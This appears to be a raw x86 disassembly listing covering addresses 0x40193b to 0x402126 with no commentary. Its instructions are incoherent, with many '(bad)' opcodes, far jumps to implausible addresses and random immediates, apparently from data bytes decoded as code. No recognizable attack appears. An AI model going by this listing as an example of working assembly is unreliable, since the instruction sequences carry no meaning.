  40193b:	scas   al,BYTE PTR es:[edi]
  40193c:	in     eax,dx
  40193d:	jmp    0x4018d2
  40193f:	jnp    0x401926
  401941:	into   
  401942:	inc    edx
  401943:	or     al,0x44
  401945:	je     0x401916
  401947:	sub    al,0x3f
  40194a:	retf   
  40194b:	or     edx,eax
  40194d:	addr16 gs jge 0x40195b
  401951:	scas   al,BYTE PTR es:[edi]
  401952:	gs xchg esi,eax
  401954:	fistp  WORD PTR [ecx-0x54]
  401957:	push   esi
  401959:	cld    
  40195a:	cmc    
  40195b:	shl    DWORD PTR cs:[ecx-0x47acc4ea],cl
  401962:	lods   eax,DWORD PTR ds:[esi]
  401963:	push   ds
  401964:	sti    
  401965:	adc    BYTE PTR [ecx-0x25667416],0x6d
  40196c:	shl    DWORD PTR [ebx+0x5c22df9a],cl
  401972:	sar    eax,0x8a
  401975:	dec    esp
  401976:	ds fs add dl,ch
  40197a:	daa    
  40197b:	repnz cmp bh,BYTE PTR [eax-0x5b]
  40197f:	out    dx,eax
  401980:	nop
  401981:	add    cl,bl
  401983:	xchg   edi,edi
  401985:	inc    edx
  401986:	rcl    DWORD PTR [edx-0x25],cl
  401989:	push   edx
  40198a:	mov    al,0x56
  40198c:	jae    0x401910
  40198e:	push   esp
  40198f:	imul   ebp,DWORD PTR [esi],0x79
  401992:	fwait
  401993:	xor    eax,0x677c1b28
  401998:	mov    al,ds:0xccd70ab3
  40199d:	adc    BYTE PTR [ebx-0x9],0x9b
  4019a1:	xchg   esi,eax
  4019a2:	xchg   esi,eax
  4019a3:	mov    al,ds:0xa21fe958
  4019a8:	test   al,0x5c
  4019ab:	xchg   edx,eax
  4019ac:	dec    ecx
  4019ad:	enter  0x34d3,0x23
  4019b1:	mov    esp,0xb934a55
  4019b6:	dec    ecx
  4019b7:	dec    eax
  4019b8:	mov    esi,0xbc80be9e
  4019bd:	adc    DWORD PTR [eax+0x415ade39],ebp
  4019c3:	push   esi
  4019c4:	cmp    DWORD PTR ds:0x4af034ea,esp
  4019ca:	sbb    al,0x43
  4019cc:	int3   
  4019cd:	xchg   edi,eax
  4019ce:	and    dl,BYTE PTR [ecx]
  4019d0:	mov    al,0xd7
  4019d2:	in     eax,0xe6
  4019d4:	fst    DWORD PTR [edx-0x2bdd2b74]
  4019da:	std    
  4019db:	push   eax
  4019dc:	data16 test BYTE PTR [eax],dl
  4019df:	mov    DWORD PTR [edi+0x5fa62e27],ecx
  4019e5:	dec    edx
  4019e6:	pop    edx
  4019e7:	cwde   
  4019e8:	mov    BYTE PTR [edi],ah
  4019ea:	enter  0x4256,0x23
  4019ee:	lea    ebp,[ebp+0x3c]
  4019f1:	fdivr  DWORD PTR [esi+0x1965e864]
  4019f7:	in     al,dx
  4019f8:	stos   BYTE PTR es:[edi],al
  4019f9:	or     al,0x76
  4019fb:	pop    esi
  4019fc:	repnz out 0xcf,eax
  4019ff:	mov    edi,0xf5f07f64
  401a04:	mov    eax,0x9a4cfdf7
  401a09:	push   ebx
  401a0a:	xchg   edi,eax
  401a0b:	cmp    eax,0x342afd35
  401a10:	arpl   WORD PTR [edi+0x2f24439a],sp
  401a16:	or     DWORD PTR [eax+0x5ac0ff19],edi
  401a1c:	sub    BYTE PTR [edi],al
  401a1e:	retf   0x8e9a
  401a21:	mov    fs,WORD PTR ds:0xddfd8799
  401a27:	mov    bh,0x6e
  401a29:	add    ecx,DWORD PTR [esi+0xc]
  401a2c:	scas   eax,DWORD PTR es:[edi]
  401a2d:	jne    0x4019d9
  401a2f:	mov    edx,0x7cc0ff9d
  401a34:	xchg   bp,ax
  401a36:	xchg   ebp,eax
  401a37:	(bad)  
  401a39:	push   0x79
  401a3b:	arpl   WORD PTR [ebp-0x5f],dx
  401a3e:	sub    esi,DWORD PTR ss:[edx+0x10]
  401a42:	add    al,0x36
  401a44:	push   ebp
  401a45:	xchg   edi,eax
  401a46:	push   0x57
  401a48:	data16 mov dl,0x3b
  401a4b:	ins    DWORD PTR es:[edi],dx
  401a4c:	mov    DWORD PTR [esi+eax*8-0x60],esp
  401a50:	(bad)  
  401a52:	lods   al,BYTE PTR ds:[esi]
  401a53:	xchg   ecx,eax
  401a54:	mov    eax,0x319d2e96
  401a59:	int3   
  401a5a:	stc    
  401a5b:	adc    ecx,DWORD PTR [edx+0x86e8c94]
  401a61:	sbb    al,0x18
  401a63:	jne    0x401ac6
  401a65:	push   ebp
  401a66:	add    bl,BYTE PTR [ebx+ecx*2]
  401a69:	jmp    0x145d:0x313227ad
  401a70:	dec    edx
  401a71:	imul   ebx,DWORD PTR [edx],0x30dcbf0d
  401a77:	pop    ds
  401a78:	xor    eax,0x6d9b0a3d
  401a7d:	fst    QWORD PTR [edi+0xee46b21]
  401a83:	add    BYTE PTR [esi+0x3f],dl
  401a86:	std    
  401a87:	mov    edx,0x8669c968
  401a8c:	mov    bl,0x9e
  401a8e:	fcomp  st(0)
  401a90:	and    al,BYTE PTR [edx-0x5]
  401a93:	add    al,0x78
  401a95:	call   0x5001:0x7b7a5089
  401a9c:	retf   
  401a9d:	adc    al,0x59
  401a9f:	or     eax,0xa77abf4c
  401aa4:	jne    0x401b04
  401aa6:	mov    al,ds:0x63fe85d2
  401aab:	pop    edx
  401aac:	mov    ebx,0xfa2ceec9
  401ab1:	add    bh,BYTE PTR [ebx]
  401ab3:	add    ax,0x3d1c
  401ab7:	inc    ecx
  401ab8:	xchg   BYTE PTR [eax+0xe],dl
  401abb:	rcl    DWORD PTR [edi+0x49e668e5],0x57
  401ac2:	fist   WORD PTR [edi]
  401ac4:	dec    edx
  401ac5:	or     edi,DWORD PTR ds:0xe883e9fc
  401acb:	sbb    eax,0x938d54fd
  401ad0:	enter  0xaa80,0x62
  401ad4:	cdq    
  401ad5:	jmp    0x1d0b9fd5
  401ada:	cmp    eax,DWORD PTR [ecx]
  401adc:	inc    esi
  401add:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ade:	or     edx,DWORD PTR [ebx+0x30dfa493]
  401ae4:	push   cs
  401ae5:	xor    BYTE PTR ds:0x52098159,dh
  401aeb:	mov    ah,0x5b
  401aed:	xor    BYTE PTR [edi],dh
  401aef:	sub    esi,DWORD PTR [edx+0x72421318]
  401af5:	shr    DWORD PTR [edx+0xcf93b7a],0x60
  401afc:	(bad)  
  401afd:	mov    al,ds:0x1155e9ec
  401b02:	jl     0x401afe
  401b04:	or     dh,BYTE PTR [ebp-0x29]
  401b07:	das    
  401b08:	arpl   WORD PTR [ebp+esi*8+0x3f0b22b6],dx
  401b0f:	or     BYTE PTR [edx+0x19],dl
  401b12:	xor    BYTE PTR [ebp+eiz*4-0x7aecb557],dl
  401b19:	cdq    
  401b1a:	mov    al,0xfa
  401b1c:	scas   al,BYTE PTR es:[edi]
  401b1d:	adc    eax,0xb95d4822
  401b22:	sti    
  401b23:	cs sub ah,ch
  401b26:	out    dx,al
  401b27:	or     al,0x88
  401b29:	push   ebp
  401b2a:	leave  
  401b2b:	hlt    
  401b2c:	push   ss
  401b2d:	push   ss
  401b2e:	dec    eax
  401b2f:	leave  
  401b30:	popf   
  401b31:	in     eax,dx
  401b32:	xor    bl,0xd2
  401b35:	pop    eax
  401b36:	out    0x19,al
  401b38:	mov    al,ds:0x9b5655b6
  401b3d:	scas   eax,DWORD PTR es:[edi]
  401b3e:	ins    DWORD PTR es:[edi],dx
  401b3f:	push   edi
  401b40:	out    dx,eax
  401b41:	push   esi
  401b42:	repz xor al,0xf4
  401b45:	jle    0x401b51
  401b47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b48:	jecxz  0x401b9b
  401b4a:	test   DWORD PTR [ecx+0x27c23c],edi
  401b50:	retf   0xdd28
  401b53:	pop    ds
  401b54:	les    ebp,FWORD PTR [edi]
  401b56:	pushf  
  401b57:	scas   al,BYTE PTR es:[edi]
  401b58:	ret    
  401b59:	pop    ss
  401b5a:	daa    
  401b5b:	jp     0x401b11
  401b5d:	xor    DWORD PTR [edx-0x11],esi
  401b60:	mov    edx,0x69e061b8
  401b65:	push   es
  401b66:	cmp    eax,0xdbc739cd
  401b6b:	mov    dh,0x7d
  401b6d:	inc    esi
  401b6e:	jl     0x8befafd0
  401b74:	jbe    0x401b27
  401b76:	cmp    dh,ah
  401b78:	or     eax,0xc32629ac
  401b7d:	inc    ecx
  401b7e:	jmp    0x401bd4
  401b80:	inc    eax
  401b81:	outs   dx,BYTE PTR ds:[esi]
  401b82:	mov    ah,0xba
  401b84:	xchg   ecx,eax
  401b85:	xor    al,0xad
  401b87:	paddw  mm7,QWORD PTR [esi-0x38231973]
  401b8e:	dec    edx
  401b8f:	sub    ah,BYTE PTR [ebx+0x7a569828]
  401b95:	push   0xffffffda
  401b97:	jb     0x401bfb
  401b99:	repz (bad) 
  401b9b:	out    0x79,al
  401b9d:	sbb    BYTE PTR [esp+edi*4],dl
  401ba0:	adc    DWORD PTR [edx-0x7a],eax
  401ba3:	adc    dl,BYTE PTR [ebx+0x50669743]
  401ba9:	add    DWORD PTR [edx+eiz*2+0x1c4b5585],edi
  401bb0:	add    eax,0xb44f6d11
  401bb5:	mov    WORD PTR [edi+0x622cdc46],gs
  401bbb:	fld    QWORD PTR [ebp-0x24]
  401bbe:	out    dx,eax
  401bbf:	dec    eax
  401bc0:	test   DWORD PTR [edx+0x310bfa90],ecx
  401bc6:	jg     0x401c3d
  401bc8:	jb     0x401c1f
  401bca:	or     eax,0x65022d1
  401bcf:	pop    edi
  401bd0:	sub    ebp,DWORD PTR [ebp-0x7b3a63de]
  401bd6:	ret    0xfacf
  401bd9:	leave  
  401bda:	icebp  
  401bdb:	loop   0x401bfe
  401bdd:	mov    ch,ah
  401bdf:	jmp    0x401301df
  401be4:	(bad)  
  401be5:	stos   DWORD PTR es:[edi],eax
  401be6:	pop    ss
  401be7:	add    ecx,DWORD PTR [edx+0x47]
  401bea:	inc    esp
  401beb:	xchg   esi,eax
  401bec:	or     al,0x72
  401bee:	jle    0x401bf1
  401bf0:	mov    ah,0x69
  401bf2:	push   ebp
  401bf3:	sbb    al,0xc5
  401bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bf6:	rol    BYTE PTR [ecx+0x5056f50c],1
  401bfc:	outs   dx,DWORD PTR ds:[esi]
  401bfd:	rcr    ah,cl
  401bff:	and    dl,dh
  401c01:	add    edi,DWORD PTR [edi+0x74]
  401c04:	cmp    bh,BYTE PTR [edx]
  401c06:	sbb    ebx,DWORD PTR [edx-0x3585eb56]
  401c0c:	into   
  401c0d:	xor    BYTE PTR [ebx-0x71],0xf1
  401c11:	std    
  401c12:	repz mov esp,0x45d92fba
  401c18:	or     ebx,ecx
  401c1a:	mov    ds:0xf8e6dccc,al
  401c1f:	jbe    0x401bc6
  401c21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c22:	arpl   WORD PTR [edi],ax
  401c24:	data16 jno 0x401bc1
  401c27:	adc    eax,0x6fe4d3c8
  401c2c:	cdq    
  401c2d:	xchg   esi,eax
  401c2e:	fwait
  401c2f:	mov    dl,0x77
  401c31:	push   ebx
  401c32:	imul   eax,esp,0xffffffc2
  401c35:	cs pushw 0x54
  401c39:	add    DWORD PTR [ebx-0x43a1a720],ebx
  401c3f:	and    DWORD PTR [ecx+ecx*1+0x145d5ead],ecx
  401c46:	sub    BYTE PTR [eax+0x24ebc20f],ch
  401c4c:	int3   
  401c4d:	adc    eax,0x2cce5e33
  401c52:	test   BYTE PTR [eax+0x56],bl
  401c55:	pop    ss
  401c56:	sbb    DWORD PTR [edi],ebx
  401c58:	bnd jg 0x401c67
  401c5b:	pop    ebx
  401c5c:	push   ds
  401c5d:	sub    BYTE PTR [ecx+0x575a6f5f],al
  401c63:	inc    esp
  401c64:	inc    ebx
  401c65:	cmp    DWORD PTR [edi],0x8f5b40b3
  401c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c6c:	inc    edi
  401c6d:	push   ebx
  401c6e:	das    
  401c6f:	out    dx,al
  401c70:	adc    edi,DWORD PTR [ebp+ebx*8-0x7a]
  401c74:	pushf  
  401c75:	xchg   ebx,eax
  401c76:	pop    edi
  401c77:	inc    ecx
  401c78:	mov    ds:0x98b7e619,al
  401c7d:	xor    DWORD PTR [ebp+eax*8-0xd598959],esp
  401c84:	dec    edx
  401c85:	pop    edi
  401c86:	aam    0x52
  401c88:	mov    ebx,0xe8c1eed2
  401c8d:	pop    edx
  401c8e:	or     al,0xb0
  401c90:	sub    DWORD PTR [eax+0x7],ecx
  401c93:	lds    edx,FWORD PTR [esi-0x5]
  401c96:	inc    eax
  401c97:	fisttp QWORD PTR ss:[ebx-0x79a8adb1]
  401c9e:	test   DWORD PTR [ebx],0x2b1da739
  401ca4:	dec    ecx
  401ca5:	adc    esp,DWORD PTR [ebp-0x9574318]
  401cab:	imul   ebx,DWORD PTR [ecx+0x65],0xffffff99
  401caf:	inc    esi
  401cb0:	js     0x401d0d
  401cb2:	inc    edi
  401cb3:	jb     0x401d20
  401cb5:	dec    ecx
  401cb6:	sub    dl,dh
  401cb8:	std    
  401cb9:	push   ecx
  401cba:	std    
  401cbb:	xchg   edx,eax
  401cbc:	push   0x6738aef3
  401cc1:	jbe    0x401d34
  401cc3:	cli    
  401cc4:	and    dh,BYTE PTR [ebp+0x22]
  401cc7:	cmp    esp,ecx
  401cc9:	dec    esi
  401cca:	push   es
  401ccb:	aam    0x24
  401ccd:	jmp    0x401cb2
  401ccf:	dec    cl
  401cd1:	push   ebx
  401cd2:	add    al,0xe0
  401cd4:	dec    edi
  401cd5:	out    0x23,al
  401cd7:	pusha  
  401cd8:	add    DWORD PTR [bp+si+0x3610],ebx
  401cdd:	pusha  
  401cde:	jmp    0x2a29ade3
  401ce3:	mov    esi,0xe218b5f5
  401ce8:	xchg   BYTE PTR [edx+0x5d],bh
  401ceb:	xor    eax,0x3e082319
  401cf0:	mov    ecx,0x46082ef6
  401cf5:	jge    0x401cb8
  401cf7:	idiv   DWORD PTR [edi-0x78ac9214]
  401cfd:	pop    ecx
  401cfe:	mov    BYTE PTR [edx+0x66],dl
  401d01:	lea    edi,[ecx]
  401d03:	jo     0x401d65
  401d05:	jmp    0xabdb:0xf88db5b1
  401d0c:	popf   
  401d0d:	ins    DWORD PTR es:[edi],dx
  401d0e:	mov    edx,0xa06c74aa
  401d13:	fs sbb cl,dh
  401d16:	cdq    
  401d17:	and    eax,esp
  401d19:	dec    ebx
  401d1a:	loopne 0x401d14
  401d1c:	or     cl,0x25
  401d1f:	xchg   ecx,eax
  401d20:	jns    0x401cde
  401d22:	lea    eax,[ecx+0x6f8c15be]
  401d28:	dec    edi
  401d29:	lea    edx,[ebp+0x43]
  401d2c:	xor    ah,cl
  401d2e:	lods   al,BYTE PTR ss:[esi]
  401d30:	dec    ecx
  401d31:	or     DWORD PTR [eax],esp
  401d33:	out    dx,eax
  401d34:	in     eax,dx
  401d35:	or     BYTE PTR [eax],0x2d
  401d38:	mov    ebx,0x50e57bf7
  401d3d:	pop    ss
  401d3e:	sti    
  401d3f:	dec    esp
  401d40:	lock inc esi
  401d42:	int3   
  401d43:	cmp    BYTE PTR [edi+eax*4+0x53e5aec5],cl
  401d4a:	ja     0x401d5c
  401d4c:	cld    
  401d4d:	vorpd  ymm5,ymm2,YMMWORD PTR [ebx+esi*4]
  401d52:	int    0xf6
  401d54:	xchg   edx,eax
  401d55:	xlat   BYTE PTR ds:[ebx]
  401d56:	sub    BYTE PTR [esi-0x23b7dd0d],dh
  401d5c:	mov    DWORD PTR ds:0x3dccdcc5,ebp
  401d62:	mov    ds:0x3527ca01,eax
  401d67:	jno    0x401d77
  401d69:	adc    BYTE PTR [ecx+0x0],al
  401d6c:	or     al,0x8f
  401d6e:	ja     0x401da2
  401d70:	call   0x4c1d:0xaed80116
  401d77:	adc    ecx,DWORD PTR [esi+esi*4]
  401d7a:	xchg   esi,eax
  401d7b:	das    
  401d7c:	inc    eax
  401d7d:	push   eax
  401d7e:	fdiv   QWORD PTR [esi+0x9]
  401d81:	jp     0x401d59
  401d83:	jnp    0x401d80
  401d85:	test   BYTE PTR [ecx+0x510a67c9],dh
  401d8b:	and    eax,0xa55176d7
  401d90:	xchg   edx,eax
  401d91:	mov    ds:0x42037ee6,eax
  401d96:	js     0x401da5
  401d98:	in     al,dx
  401d99:	in     al,0x6e
  401d9b:	adc    ch,dh
  401d9d:	xor    DWORD PTR [esp+ebx*2],esi
  401da0:	sub    BYTE PTR [ebx+0x3],ah
  401da3:	cmc    
  401da4:	cmp    al,0x30
  401da6:	ds test bl,bh
  401da9:	cmp    esp,ebp
  401dab:	cmp    BYTE PTR [eax-0x4357ffdf],ah
  401db1:	push   es
  401db2:	sti    
  401db3:	add    al,0x12
  401db5:	xchg   edi,eax
  401db6:	call   0x371f:0x9ff6c8a1
  401dbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401dbe:	cmp    ebx,DWORD PTR [esi]
  401dc0:	lock in eax,dx
  401dc2:	adc    al,0x73
  401dc4:	je     0x401d4b
  401dc6:	mov    dl,0x9f
  401dc8:	add    eax,0x90c366a9
  401dcd:	imul   esp,eax,0xba9c5250
  401dd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dd4:	jbe    0x401da7
  401dd6:	cdq    
  401dd7:	sbb    dh,BYTE PTR [ebx]
  401dd9:	jb     0x401d9e
  401ddb:	fstp   TBYTE PTR [eax]
  401ddd:	ins    DWORD PTR es:[edi],dx
  401dde:	ins    BYTE PTR es:[edi],dx
  401ddf:	or     DWORD PTR [esi],edx
  401de1:	add    BYTE PTR [ecx+0x354a454d],al
  401de7:	sbb    cl,BYTE PTR [edi-0x77a222c]
  401ded:	xchg   ah,al
  401def:	call   0xacee:0x2a427528
  401df6:	or     DWORD PTR [ecx-0x8],edi
  401df9:	mov    ah,0x72
  401dfb:	imul   ebx,DWORD PTR fs:[ebx+ecx*8],0x43
  401e00:	mov    edi,0xb1235751
  401e05:	mov    ebp,0x466bfd03
  401e0a:	adc    al,0x4a
  401e0c:	jg     0x401e28
  401e0e:	test   DWORD PTR [ebp+0x68],eax
  401e11:	cmp    DWORD PTR ss:[edi],ecx
  401e14:	call   0x3827:0x5d71e66e
  401e1b:	pop    es
  401e1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e1d:	pop    ss
  401e1e:	or     ch,BYTE PTR [esi]
  401e20:	out    dx,eax
  401e21:	imul   ebx,DWORD PTR [ecx],0x262ab1fd
  401e27:	xchg   ebx,eax
  401e28:	xor    BYTE PTR [ebx+0x7bfb173b],dh
  401e2e:	pop    esi
  401e2f:	mov    eax,0xf1bcc8b1
  401e34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e35:	shl    BYTE PTR [edi+ecx*8-0x7],1
  401e39:	shl    BYTE PTR [ebp+0x7568a435],0x7b
  401e40:	dec    ecx
  401e41:	jle    0x401ea2
  401e43:	mov    WORD PTR [edi-0x71a2d1b5],fs
  401e49:	xor    esi,DWORD PTR [esi-0x75]
  401e4c:	xchg   eax,eax
  401e4e:	inc    esp
  401e4f:	pop    esi
  401e50:	pop    ss
  401e51:	sbb    dl,ah
  401e53:	call   0x4d8d:0x27536c9b
  401e5a:	jmp    0x401e33
  401e5c:	mov    WORD PTR [edx+0x29bbe063],gs
  401e62:	jle    0x401e58
  401e64:	adc    eax,0x8cee9e25
  401e69:	sahf   
  401e6a:	stc    
  401e6b:	pop    ecx
  401e6c:	pop    ds
  401e6d:	and    bl,BYTE PTR [edi+0x35]
  401e70:	fucomip st,st(0)
  401e72:	pop    ds
  401e73:	and    eax,0x580f5f35
  401e78:	int3   
  401e79:	enter  0xaa0f,0x76
  401e7d:	push   ss
  401e7e:	cmp    dl,BYTE PTR [ebp+0x13fd6094]
  401e84:	(bad)  
  401e85:	mov    ecx,0xc66ed113
  401e8a:	shl    edi,1
  401e8c:	repz retf 0xd251
  401e90:	push   0x5edd9a06
  401e95:	xor    DWORD PTR [eax],edi
  401e97:	(bad)  
  401e98:	jle    0x401ea7
  401e9a:	test   eax,0x698ec11a
  401e9f:	repz mov ch,0x7c
  401ea2:	lea    edx,[edx+0x2f7d196]
  401ea8:	mov    WORD PTR [eax+0xadde774],gs
  401eae:	addr16 xchg ecx,eax
  401eb0:	xchg   edi,eax
  401eb1:	clc    
  401eb2:	mov    ecx,0x473fe78e
  401eb7:	mov    ah,0x3c
  401eb9:	pop    es
  401eba:	test   DWORD PTR [edx+0x32e02f71],ebp
  401ec0:	and    eax,0x6dca8d84
  401ec5:	ds ret 
  401ec7:	ret    0x2ec8
  401eca:	leave  
  401ecb:	pushf  
  401ecc:	bound  ebp,QWORD PTR ds:[edi]
  401ecf:	mov    DWORD PTR [edi+0x34b9ff5b],edi
  401ed5:	or     ebp,DWORD PTR [esi]
  401ed7:	(bad)  
  401ed8:	mov    al,0xe6
  401eda:	ins    BYTE PTR es:[edi],dx
  401edb:	sbb    bl,al
  401edd:	inc    edi
  401ede:	scas   al,BYTE PTR es:[edi]
  401edf:	push   esp
  401ee0:	fmul   DWORD PTR [edi]
  401ee2:	sbb    DWORD PTR [esi+0x40],0x69dfbe49
  401ee9:	sub    dl,ah
  401eeb:	sub    bl,BYTE PTR [eax+0x7e]
  401eee:	test   DWORD PTR [esp],ebp
  401ef1:	push   eax
  401ef2:	sbb    DWORD PTR [esi-0x2a],0xffffffe5
  401ef6:	jmp    0x401ead
  401ef8:	and    edi,eax
  401efa:	out    0x26,al
  401efc:	mov    ah,0xca
  401efe:	xchg   esi,eax
  401eff:	lods   al,BYTE PTR ds:[esi]
  401f00:	jbe    0x401ea4
  401f02:	cmpxchg DWORD PTR [eax+ebx*8+0x138d56a],ecx
  401f0a:	daa    
  401f0b:	sub    al,0x66
  401f0e:	mov    ds:0x274a695a,eax
  401f13:	test   eax,0x8389a9a4
  401f18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f19:	dec    eax
  401f1a:	xchg   DWORD PTR [ebx+0x9e588c],esi
  401f20:	in     eax,dx
  401f21:	cmp    DWORD PTR [esi],ebp
  401f23:	fidivr WORD PTR es:[edx-0x14e4ef2]
  401f2a:	push   ebx
  401f2b:	mov    ch,0x76
  401f2d:	test   al,0x16
  401f2f:	(bad)  
  401f30:	div    BYTE PTR [eax-0x60]
  401f33:	pop    es
  401f34:	cli    
  401f35:	dec    edi
  401f36:	jle    0x401ef6
  401f38:	jl     0x401f6d
  401f3a:	ins    BYTE PTR es:[edi],dx
  401f3b:	inc    ebp
  401f3c:	pop    ebx
  401f3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f3e:	(bad)  
  401f3f:	and    ebx,DWORD PTR [esi*8-0x107d6398]
  401f46:	xor    BYTE PTR [esi-0x47e5fa35],al
  401f4c:	clc    
  401f4d:	and    esi,DWORD PTR [eax+0x6c]
  401f50:	hlt    
  401f51:	add    al,0x5
  401f53:	loopne 0x401f93
  401f55:	add    edx,ecx
  401f57:	out    dx,al
  401f58:	jl     0x401f59
  401f5a:	test   eax,0xcd928de7
  401f5f:	dec    esi
  401f60:	popf   
  401f61:	jne    0x401f19
  401f63:	scas   eax,DWORD PTR es:[edi]
  401f64:	jo     0x401f4b
  401f66:	ds inc edi
  401f68:	push   edx
  401f69:	mov    esp,0x35709cbe
  401f6e:	mov    dl,0xdd
  401f70:	and    esi,DWORD PTR [ebp+esi*1+0xb]
  401f74:	push   ss
  401f75:	or     dh,BYTE PTR [ebp+edx*2-0x5546d998]
  401f7c:	or     BYTE PTR [edi-0x54],dl
  401f7f:	or     eax,0x8c547729
  401f84:	cli    
  401f85:	sbb    al,0xb1
  401f87:	cmp    eax,DWORD PTR [ecx*4+0xd1c70fa]
  401f8e:	les    edi,FWORD PTR [ebp-0x6a]
  401f91:	push   edx
  401f92:	pop    esi
  401f93:	mov    ch,0x9
  401f95:	adc    bh,BYTE PTR [esi+0x51aecca]
  401f9b:	jns    0x402005
  401f9d:	aam    0x94
  401f9f:	and    ebx,DWORD PTR [eax-0x1befae6a]
  401fa5:	fmul   DWORD PTR [ecx+0x577418a6]
  401fab:	or     BYTE PTR [esi],0x52
  401fae:	inc    ebx
  401faf:	or     DWORD PTR [ebx+0x14],ecx
  401fb2:	lods   eax,DWORD PTR ds:[esi]
  401fb3:	cmp    al,0x47
  401fb5:	push   ss
  401fb6:	mov    ebp,0x8796c096
  401fbb:	mov    edx,0x997ec014
  401fc0:	fdivr  QWORD PTR [ebx]
  401fc2:	retf   
  401fc3:	jnp    0x401fa3
  401fc5:	jmp    0x6cc0206d
  401fca:	push   0x9b887f7c
  401fcf:	inc    ebx
  401fd0:	test   al,0xe2
  401fd2:	xlat   BYTE PTR ds:[ebx]
  401fd3:	dec    ebp
  401fd4:	sub    esi,esi
  401fd6:	imul   ebx,DWORD PTR [esi+0x29a458f1],0xa4e2e3c4
  401fe0:	dec    edi
  401fe1:	imul   edi,edi,0x45
  401fe4:	mov    eax,0xefa4a28c
  401fe9:	xchg   DWORD PTR [edi],esp
  401feb:	ins    DWORD PTR es:[edi],dx
  401fec:	arpl   WORD PTR ds:0xa04a642e,bp
  401ff2:	mov    dh,0x78
  401ff4:	cmp    bl,BYTE PTR [edi+0x70]
  401ff7:	jae    0x401f90
  401ff9:	(bad)  
  401ffa:	ficomp WORD PTR [eax]
  401ffc:	mov    es,WORD PTR [ecx-0x4d]
  401fff:	aad    0x3c
  402001:	mov    edx,DWORD PTR [ecx-0x75dc8e36]
  402007:	cmp    cl,0x3c
  40200a:	add    DWORD PTR [ebp+0x5b],edi
  40200d:	xchg   edx,eax
  40200e:	jge    0x401ff4
  402010:	stc    
  402011:	(bad)  
  402012:	std    
  402013:	sbb    dh,bl
  402015:	call   0x6b70dcb2
  40201a:	bound  edx,QWORD PTR [ebx-0x4df8ead]
  402020:	jge    0x40202a
  402022:	addr16 xchg ebx,eax
  402024:	inc    eax
  402025:	mov    edx,es
  402027:	(bad)  
  402028:	icebp  
  402029:	push   ss
  40202a:	mov    bl,BYTE PTR [ebx-0x71]
  40202d:	sbb    al,BYTE PTR [edi]
  40202f:	pusha  
  402030:	jnp    0x4020af
  402032:	lods   eax,DWORD PTR ds:[esi]
  402033:	rcr    eax,cl
  402035:	aas    
  402036:	les    esi,FWORD PTR [esi-0x62]
  402039:	cmp    eax,0xdd82f696
  40203e:	jmp    0x4f8334
  402043:	je     0x402023
  402045:	xchg   esi,eax
  402046:	push   0x1bd329cc
  40204b:	sbb    DWORD PTR [esi-0x28],ecx
  40204e:	cld    
  40204f:	mov    esp,0xdc24d60d
  402054:	imul   DWORD PTR [ecx-0x76]
  402057:	bound  ebx,QWORD PTR [ecx-0x1225a3e4]
  40205d:	add    BYTE PTR [ebx-0x4a],dl
  402060:	in     al,0x21
  402062:	fcomp  DWORD PTR [ebp+0x42]
  402065:	mov    DWORD PTR [edi-0x14],0xe31fc73e
  40206c:	cmp    esi,esi
  40206e:	mov    ?,WORD PTR [edx-0x3]
  402071:	adc    edx,edi
  402073:	dec    eax
  402074:	imul   ecx,DWORD PTR [edi-0x5a],0xfffffff8
  402078:	pop    ebp
  402079:	ins    BYTE PTR es:[edi],dx
  40207a:	sub    al,0xa9
  40207c:	xor    ah,bh
  40207e:	mov    ds:0xf22cd385,eax
  402083:	mov    esi,0x7fbc9e23
  402088:	add    DWORD PTR [ebp*2-0x62252721],0xffffffcf
  402090:	pop    edx
  402091:	aas    
  402092:	test   DWORD PTR [ecx+eiz*1+0x6e4952b3],0x9c121b48
  40209d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40209e:	mov    ds:0x92fb9893,eax
  4020a3:	rol    DWORD PTR [ebp-0x42],cl
  4020a6:	je     0x4020ae
  4020a8:	fdiv   DWORD PTR [edi-0x4c50738b]
  4020ae:	pop    eax
  4020af:	stos   DWORD PTR es:[edi],eax
  4020b0:	xchg   ebp,esi
  4020b2:	push   0x78
  4020b4:	ins    DWORD PTR es:[edi],dx
  4020b5:	xchg   DWORD PTR [edi+0x4c89db21],esp
  4020bb:	sahf   
  4020bc:	repnz arpl WORD PTR cs:0xeab1b4a7,ax
  4020c4:	les    edx,FWORD PTR [ecx]
  4020c6:	retf   
  4020c7:	aad    0xa3
  4020c9:	lock pusha 
  4020cb:	sub    edx,DWORD PTR [ecx]
  4020cd:	(bad)  
  4020ce:	in     al,0x7f
  4020d0:	stos   DWORD PTR es:[edi],eax
  4020d1:	(bad)  
  4020d2:	jl     0x40212e
  4020d4:	das    
  4020d5:	dec    esi
  4020d6:	mov    al,ds:0x1e929887
  4020db:	leave  
  4020dc:	jge    0x402099
  4020de:	aas    
  4020df:	cmp    ebx,DWORD PTR [ebp+ecx*4+0x68a94c6d]
  4020e6:	add    BYTE PTR [edx+eax*4+0x6e],bl
  4020ea:	call   0x975f:0x74d004eb
  4020f1:	cmp    al,0x96
  4020f3:	inc    ebx
  4020f4:	push   edx
  4020f5:	stos   BYTE PTR es:[edi],al
  4020f6:	jg     0x4020c1
  4020f8:	bound  ecx,QWORD PTR [edx+ebp*4]
  4020fb:	push   ebp
  4020fc:	jmp    0x2d8c5d5
  402101:	loop   0x40214f
  402103:	sub    DWORD PTR [ecx-0x2],eax
  402106:	mov    ebp,0xfaa22336
  40210b:	aam    0x9b
  40210d:	push   ecx
  40210e:	sbb    ah,BYTE PTR [eax]
  402110:	call   0x81dd2084
  402115:	inc    edi
  402116:	xchg   DWORD PTR [esi-0x2a],eax
  402119:	xchg   BYTE PTR [esi],cl
  40211b:	fcom   DWORD PTR [edi]
  40211d:	or     DWORD PTR [eax+0x7a246319],edx
  402123:	add    cl,BYTE PTR [ebp-0x36]
  402126:	cs cmp al,0x88
